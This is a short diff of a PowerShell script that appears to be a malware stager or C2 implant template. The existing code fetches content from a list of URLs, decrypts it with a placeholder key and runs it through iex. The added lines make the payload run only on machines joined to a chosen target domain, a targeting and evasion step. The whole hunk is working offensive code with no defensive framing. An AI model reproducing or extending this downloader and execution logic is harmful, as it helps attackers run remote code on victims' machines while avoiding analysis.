@@ -84,6 +84,10 @@ $p = dec -key #REPLACEKEY# -enc $primern
 if ($p -like "*key*") {$p| iex}
 }
 function primers {
+if(![string]::IsNullOrEmpty("#REPLACEMEDOMAIN#") -and ![Environment]::UserDomainName.Contains("#REPLACEMEDOMAIN#"))
+{
+    return;
+}
 foreach($url in $urls){
 $index = [array]::IndexOf($urls, $url)
 try {primern $url $curl $df[$index]} catch {write-output $error[0]}}}
